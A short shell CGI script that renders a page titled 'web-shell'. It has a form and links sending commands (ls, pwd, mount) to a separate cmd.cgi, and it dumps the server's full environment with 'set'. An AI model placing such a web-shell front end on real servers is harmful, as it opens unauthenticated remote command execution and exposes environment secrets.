#!/bin/sh
echo "Content-type: text/html"
echo ""
echo "<html>"
echo "<title> list of  </title>"
echo "<body>"
echo "<h1>web-shell </h1>"

echo "<form method=get action=cmd.cgi>"
echo "<input type=text size=40 name=var1 value=ls>" 
#echo "<input type=text size=40 name=var2 value=mount>" 
echo "<input type=submit value='run'>"
echo "</form>"

echo "<li><a href=cmd.cgi?pwd> PWD </a><br>"
echo "<li><a href=cmd.cgi?ls> LS </a><br>"
echo "<li><a href=cmd.cgi?mount> MOUNT </a><br>"

echo "<b>Environment</b><br>"
echo "<pre>"
set
echo "</pre>"

echo "</body>"
echo "</html>"






